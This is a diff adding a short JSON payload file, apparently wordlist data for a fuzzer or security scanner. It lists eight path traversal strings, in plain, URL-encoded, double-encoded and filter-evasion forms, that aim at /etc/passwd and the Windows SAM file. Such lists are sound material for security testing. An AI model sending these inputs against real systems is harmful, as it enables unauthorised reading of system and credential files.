@@ -1,0 +1,13 @@
+{
+  "payloads": [
+    "../../../etc/passwd",
+    "../../../../../../windows/system32/config/sam",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "..\\..\\..\\windows\\system32\\config\\sam",
+    "....//....//....//etc/passwd",
+    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+    "....../....../....../etc/passwd",
+    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+  ],
+  "version": "2.0.0"
+}
